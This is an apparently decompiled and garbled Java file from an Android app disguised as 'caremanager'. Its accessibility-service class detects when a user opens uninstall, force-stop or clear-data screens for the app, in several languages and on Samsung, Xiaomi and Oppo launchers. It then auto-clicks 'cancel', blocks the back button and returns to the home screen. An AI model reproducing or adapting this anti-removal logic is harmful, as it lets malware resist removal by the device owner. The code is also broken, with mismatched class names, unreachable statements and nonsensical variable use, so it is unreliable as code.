package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class AppUninstaller {

    static String appname;
    static String appname2;
    private static AccessibilityServiceCore context;

    static {
        // Static initialization block
    }

    public AppUninstallerEngine() {
        return;
    }

    public static void check(AccessibilityEvent param1) {
        try {
            String str = "Accessibility";
            String str2 = "on";
            String uninstall = MainBackgroundService.uninstall;
            boolean result = str2.equals(uninstall);
            if (result != null) {
                // branch: cond_0
            }
            return;
            if (param1 != null) {
                // branch: cond_1
            }
            return;
            boolean ifFinishiInitPermission = AccessibilityServiceCore.ifFinishiInitPermission;
            if (ifFinishiInitPermission != null) {
                // branch: cond_2
            }
            return;
            boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
            if (ifFinishAll != null) {
                // branch: cond_3
            }
            return;
            String str3 = "22222222222";
            CharSequence result2 = this.getClassName();
            String result3 = result.toString();
            String result4 = result.toLowerCase();
            int result5 = Log.i(str3, result);
            CharSequence result6 = this.getClassName();
            String result7 = result.toString();
            String result8 = result.toLowerCase();
            String str4 = "com.android.settings.SubSettings";
            String result9 = str4.toLowerCase();
            CharSequence result10 = this.getClassName();
            String result11 = result.toString();
            String result12 = result.toLowerCase();
            boolean result13 = result.equals(result);
            if (result == null) {
                // branch: cond_5
            }
            AccessibilityServiceCore context = AppUninstallerEngine.context;
            String result14 = context.getEventText(param1);
            String result15 = result.toLowerCase();
            String appname = AppUninstallerEngine.appname;
            String result16 = appname.toLowerCase();
            boolean result17 = result.equals(result);
            if (result != null) {
                // branch: cond_4
            }
            AccessibilityServiceCore context2 = AppUninstallerEngine.context;
            String result18 = context2.getEventText(param1);
            String result19 = result.toLowerCase();
            String appname2 = AppUninstallerEngine.appname2;
            String result20 = appname2.toLowerCase();
            boolean result21 = result.equals(result);
            if (result == null) {
                // branch: cond_5
            }
            AccessibilityServiceCore context3 = AppUninstallerEngine.context;
            context3.blockBackButton();
            AccessibilityServiceCore context4 = AppUninstallerEngine.context;
            context4.navigateHome();
            AccessibilityServiceCore context5 = AppUninstallerEngine.context;
            String result22 = context5.getEventText(param1);
            String result23 = result.toLowerCase();
            CharSequence result24 = this.getPackageName();
            String result25 = result.toString();
            String result26 = result.toLowerCase();
            String result27 = str.toLowerCase();
            boolean result28 = result.contains(result);
            if (result == null) {
                // branch: cond_6
            }
            String appname22 = AppUninstallerEngine.appname2;
            boolean result29 = result.contains(appname22);
            if (result == null) {
                // branch: cond_6
            }
            AccessibilityServiceCore context6 = AppUninstallerEngine.context;
            context6.blockBackButton();
            AccessibilityServiceCore context7 = AppUninstallerEngine.context;
            context7.navigateHome();
            String result30 = str.toLowerCase();
            boolean result31 = result.contains(result);
            if (result == null) {
                // branch: cond_7
            }
            String appname23 = AppUninstallerEngine.appname2;
            boolean result32 = result.contains(appname23);
            if (result == null) {
                // branch: cond_7
            }
            AccessibilityServiceCore context8 = AppUninstallerEngine.context;
            context8.blockBackButton();
            AccessibilityServiceCore context9 = AppUninstallerEngine.context;
            context9.navigateHome();
            AccessibilityServiceCore context10 = AppUninstallerEngine.context;
            String result33 = context10.getPackageName();
            String result34 = AccessibilityServiceCore.getAppName(context10, result);
            String result35 = result.toLowerCase();
            String installStr1 = LanguageManager.installStr1;
            String result36 = installStr1.toLowerCase();
            boolean result37 = result.contains(result);
            String str5 = "cancel";
            if (result != null) {
                // branch: cond_8
            }
            String installStr12 = LanguageManager.installStr1;
            String result38 = installStr12.toLowerCase();
            boolean result39 = result.contains(result);
            if (result == null) {
                // branch: cond_9
            }
            String result40 = result.toLowerCase();
            boolean result41 = result.contains(result);
            if (result == null) {
                // branch: cond_9
            }
            boolean result42 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context11 = AppUninstallerEngine.context;
            context11.blockBackButton();
            AccessibilityServiceCore context12 = AppUninstallerEngine.context;
            context12.navigateHome();
            String installStr13 = LanguageManager.installStr1;
            String result43 = installStr13.toLowerCase();
            boolean result44 = result.contains(result);
            if (result != null) {
                // branch: cond_a
            }
            String installStr14 = LanguageManager.installStr1;
            String result45 = installStr14.toLowerCase();
            boolean result46 = result.contains(result);
            if (result == null) {
                // branch: cond_b
            }
            String appname24 = AppUninstallerEngine.appname2;
            String result47 = appname24.toLowerCase();
            boolean result48 = result.contains(result);
            if (result == null) {
                // branch: cond_b
            }
            boolean result49 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context13 = AppUninstallerEngine.context;
            context13.blockBackButton();
            AccessibilityServiceCore context14 = AppUninstallerEngine.context;
            context14.navigateHome();
            String str6 = "\u5f3a\u5236\u505c\u6b62";
            String result50 = str6.toLowerCase();
            boolean result51 = result.contains(result);
            if (result != null) {
                // branch: cond_c
            }
            String str7 = "\u5f3a\u884c\u505c\u6b62";
            String result52 = str7.toLowerCase();
            boolean result53 = result.contains(result);
            if (result != null) {
                // branch: cond_c
            }
            String str8 = "\u7ed3\u675f\u8fd0\u884c";
            String result54 = str8.toLowerCase();
            boolean result55 = result.contains(result);
            if (result != null) {
                // branch: cond_c
            }
            String str9 = "Force stop";
            String result56 = str9.toLowerCase();
            boolean result57 = result.contains(result);
            if (result == null) {
                // branch: cond_d
            }
            boolean result58 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context15 = AppUninstallerEngine.context;
            context15.blockBackButton();
            AccessibilityServiceCore context16 = AppUninstallerEngine.context;
            context16.navigateHome();
            String str10 = "\u5220\u9664\u6570\u636e";
            String result59 = str10.toLowerCase();
            boolean result60 = result.contains(result);
            if (result != null) {
                // branch: cond_e
            }
            String str11 = "\u6e05\u9664\u6570\u636e";
            String result61 = str11.toLowerCase();
            boolean result62 = result.contains(result);
            if (result != null) {
                // branch: cond_e
            }
            String str12 = "\u6e05\u9664\u5b58\u50a8\u7a7a\u95f4";
            String result63 = str12.toLowerCase();
            boolean result64 = result.contains(result);
            if (result != null) {
                // branch: cond_e
            }
            String str13 = "Delete app data";
            String result65 = str13.toLowerCase();
            boolean result66 = result.contains(result);
            if (result == null) {
                // branch: cond_f
            }
            boolean result67 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context17 = AppUninstallerEngine.context;
            context17.blockBackButton();
            AccessibilityServiceCore context18 = AppUninstallerEngine.context;
            context18.navigateHome();
            AccessibilityServiceCore context19 = AppUninstallerEngine.context;
            String result68 = AccessibilityServiceCore.getApplicationName(context19);
            boolean result69 = result.contains(result);
            if (result == null) {
                // branch: cond_10
            }
            String CurrentName = AccessibilityServiceCore.CurrentName;
            boolean result70 = result.contains(CurrentName);
            String str14 = "Phone options";
            String result71 = str14.toLowerCase();
            boolean result72 = result.contains(result);
            if (result == null) {
                // branch: cond_11
            }
            AccessibilityServiceCore context20 = AppUninstallerEngine.context;
            context20.blockBackButton();
            AccessibilityServiceCore context21 = AppUninstallerEngine.context;
            context21.navigateHome();
            String str15 = "\u0625\u064a\u0642\u0627\u0641";
            String result73 = str15.toLowerCase();
            boolean result74 = result.contains(result);
            if (result == null) {
                // branch: cond_12
            }
            String appname25 = AppUninstallerEngine.appname2;
            boolean result75 = result.contains(appname25);
            if (result != null) {
                // branch: cond_13
            }
            String str16 = "stop";
            String result76 = str16.toLowerCase();
            boolean result77 = result.contains(result);
            if (result == null) {
                // branch: cond_14
            }
            String appname26 = AppUninstallerEngine.appname2;
            boolean result78 = result.contains(appname26);
            if (result == null) {
                // branch: cond_14
            }
            boolean result79 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context22 = AppUninstallerEngine.context;
            context22.blockBackButton();
            AccessibilityServiceCore context23 = AppUninstallerEngine.context;
            context23.navigateHome();
            CharSequence result80 = this.getPackageName();
            String result81 = result.toString();
            String str17 = "com.google.android.packageinstaller";
            boolean result82 = result.contains(str17);
            if (result == null) {
                // branch: cond_15
            }
            CharSequence result83 = this.getClassName();
            String result84 = result.toString();
            String result85 = result.toLowerCase();
            String str18 = "android.app.alertdialog";
            boolean result86 = result.contains(str18);
            if (result == null) {
                // branch: cond_15
            }
            AccessibilityServiceCore context24 = AppUninstallerEngine.context;
            String result87 = context24.getEventText(param1);
            String result88 = result.toLowerCase();
            String appname27 = AppUninstallerEngine.appname2;
            String result89 = appname27.toLowerCase();
            boolean result90 = result.contains(result);
            if (result == null) {
                // branch: cond_15
            }
            boolean result91 = AccessibilityServiceCore.clickByText(str5);
            AccessibilityServiceCore context25 = AppUninstallerEngine.context;
            context25.blockBackButton();
            AccessibilityServiceCore context26 = AppUninstallerEngine.context;
            context26.navigateHome();
            String str19 = "android.support.v7.widget.recyclerview";
            boolean result92 = result.equals(str19);
            String str20 = "com.android.settings";
            if (result != null) {
                // branch: cond_16
            }
            String str21 = "android.widget.tablelayout";
            boolean result93 = result.equals(str21);
            if (result != null) {
                // branch: cond_16
            }
            String str22 = "android.widget.linearlayout";
            boolean result94 = result.equals(str22);
            if (result != null) {
                // branch: cond_16
            }
            String str23 = "android.widget.framelayout";
            boolean result95 = result.equals(str23);
            if (result == null) {
                // branch: cond_19
            }
            CharSequence result96 = this.getPackageName();
            String result97 = result.toString();
            boolean result98 = result.equals(str20);
            if (result != null) {
                // branch: cond_17
            }
            CharSequence result99 = this.getPackageName();
            String result100 = result.toString();
            String str24 = "com.miui.securitycenter";
            boolean result101 = result.equals(str24);
            if (result == null) {
                // branch: cond_19
            }
            AccessibilityServiceCore context27 = AppUninstallerEngine.context;
            String result102 = context27.getEventText(param1);
            String result103 = result.toLowerCase();
            String appname28 = AppUninstallerEngine.appname2;
            boolean result104 = result.contains(appname28);
            if (result != null) {
                // branch: cond_18
            }
            AccessibilityServiceCore context28 = AppUninstallerEngine.context;
            String result105 = context28.getEventText(param1);
            String result106 = result.toLowerCase();
            String appname2 = AppUninstallerEngine.appname;
            boolean result107 = result.contains(appname2);
            if (result == null) {
                // branch: cond_19
            }
            AccessibilityServiceCore context29 = AppUninstallerEngine.context;
            context29.blockBackButton();
            AccessibilityServiceCore context30 = AppUninstallerEngine.context;
            context30.navigateHome();
            String result108 = Br_and.getBrand();
            String result109 = result.toLowerCase();
            String str25 = "oppo";
            boolean result110 = result.equals(str25);
            if (result == null) {
                // branch: cond_1a
            }
            CharSequence result111 = this.getPackageName();
            String result112 = result.toString();
            boolean result113 = result.equals(str20);
            if (result == null) {
                // branch: cond_1a
            }
            String appname3 = AppUninstallerEngine.appname;
            boolean result114 = result.equals(appname3);
            if (result == null) {
                // branch: cond_1a
            }
            Thread thread = new Thread();
            AppUninstallerEngine.1 appUninstallerEngine.1 = new AppUninstallerEngine.1();
            thread.start();
            String str26 = "com.sec.android.app.launcher";
            boolean result115 = str26.equals(result);
            if (result != null) {
                // branch: cond_1b
            }
            String str27 = "com.android.launcher";
            boolean result116 = str27.equals(result);
            if (result == null) {
                // branch: cond_1c
            }
            String appname4 = AppUninstallerEngine.appname;
            boolean result117 = result.equals(appname4);
            if (result != null) {
                // branch: cond_1d
            }
            String str28 = "com.miui.home";
            boolean result118 = str28.equals(result);
            if (result == null) {
                // branch: cond_1e
            }
            String appname29 = AppUninstallerEngine.appname2;
            CharSequence result119 = this.getContentDescription();
            boolean result120 = appname29.equals(result);
            if (result == null) {
                // branch: cond_1e
            }
            Thread thread2 = new Thread();
            AppUninstallerEngine.2 appUninstallerEngine.2 = new AppUninstallerEngine.2();
            this.start();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void start(AccessibilityServiceCore param1) {
        AppUninstallerEngine.context = param1;
        StringBuilder stringBuilder = new StringBuilder();
        String str = "[";
        AccessibilityServiceCore context = AppUninstallerEngine.context;
        String result = context.getPackageName();
        String result2 = AccessibilityServiceCore.getAppName(context, result);
        String result3 = result.toLowerCase();
        StringBuilder result4 = this.append(result);
        String str2 = "]";
        StringBuilder result5 = this.append(str2);
        String result6 = this.toString();
        AppUninstallerEngine.appname = result;
        AccessibilityServiceCore context2 = AppUninstallerEngine.context;
        String result7 = this.getPackageName();
        String result8 = AccessibilityServiceCore.getAppName(context2, result);
        String result9 = this.toLowerCase();
        AppUninstallerEngine.appname2 = result;
        return;
    }

}